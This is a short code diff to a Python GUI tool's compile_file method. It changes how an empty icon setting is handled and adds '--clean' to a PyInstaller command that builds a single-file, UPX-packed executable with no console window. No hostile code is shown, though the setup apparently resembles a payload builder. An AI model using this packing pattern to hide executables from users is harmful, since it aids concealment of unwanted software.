@@ -394,11 +394,11 @@ class App(customtkinter.CTk):
     def compile_file(self, filename):
         exeicon = self.icon.get()
         if exeicon == "":
-            exeicon = None
+            exeicon = "NONE"
         else:
             exeicon = f"{self.basefilepath}\\{self.icon.get()}.ico"
         try:
-            subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--noconsole', '--upx-dir=./tools', '--distpath', './',
+            subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--clean', '--noconsole', '--upx-dir=./tools', '--distpath', './',
                             '--hidden-import', 'base64',
                             '--hidden-import', 'ctypes',
                             '--hidden-import', 'json',
